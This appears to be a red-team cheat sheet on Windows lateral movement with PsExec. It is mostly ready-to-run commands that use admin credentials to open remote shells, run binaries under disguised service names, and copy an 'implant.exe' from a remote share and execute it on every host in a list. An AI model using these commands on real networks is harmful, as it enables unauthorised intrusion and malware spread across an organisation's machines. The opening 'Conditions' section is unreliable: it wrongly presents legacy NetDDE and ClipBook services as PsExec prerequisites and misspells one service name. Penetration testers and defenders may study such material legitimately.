---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - living-off-the-land
  - psexec
  - network-protocols
  - smb
  - windows
---
# Living off the Land

## 01 - Conditions

It requires specific services to be enabled in order for PsExec to work. Here are the commands to enable it.

```
C:\> net.exe use \\<IP>\IPC$ /user:<username> <password>
sc.exe \\<IP> config netdde start= auto
sc.exe \\<IP> config netddedsdm start= auto
sc.exe \\<IP> config clipsrv start= auto
sc.exe \\<IP> start netdde
sc.exe \\<IP> start netddedsdm
sc.exe \\<IP> start clipserv
```

## 02 - Sysinternals

### 2.1 - Copy File from WebDAV

#### 2.1.1 - Command Prompt

```
C:\> net.exe use z: \\live.sysinternals.com\tools

C:\> copy z:\PsExec64.exe .

C:\> net.exe use z: /delete
```

#### 2.1.2 - Powershell

```
PS C:\> New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"

PS C:\> Copy-Item z:\PsExec64.exe .

PS C:\> Remove-PSDrive -Name Z
```

## 03 - Execute PsExec

### 3.1 - Single Machine

```
C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" cmd.exe

C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" -d -c "C:\path\to\shell.exe"

C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -d -c "C:\path\to\shell.exe"
```

### 3.2 - Multiple Machines

When targeting multiple computers just add the `@` sign.

```
C:\> .\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> "<commands>"
```

## 04 - Use Cases

### 4.1 - Copy and Execute Implant in Multiple Machines

> [!NOTE] One administrator user account have access to all or most machines
> Use an `Administrator` user or any domain admin account that has access to all or most Windows machines.

```
C:\> .\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> cmd.exe /c copy /y "\\<IP>\C$\implant.exe" "C:\Windows\Temp\"

.\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> -d -c "cmd.exe /c C:\Windows\Temp\implant.exe"
```

---
## References

- [Infinite Logins: Popping Remote Shells with Winexe & PTH-Winexe on Windows](https://infinitelogins.com/2020/09/05/popping-remote-shells-pth-winexe-on-windows/)

- [Abusing Windows Admin Shares (Lateral Movement)](https://www.youtube.com/watch?v=41MUhlHGZ4E)

- [Pass the Hash is Dead Long Live Pass the Hash](https://blog.harmj0y.net/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)
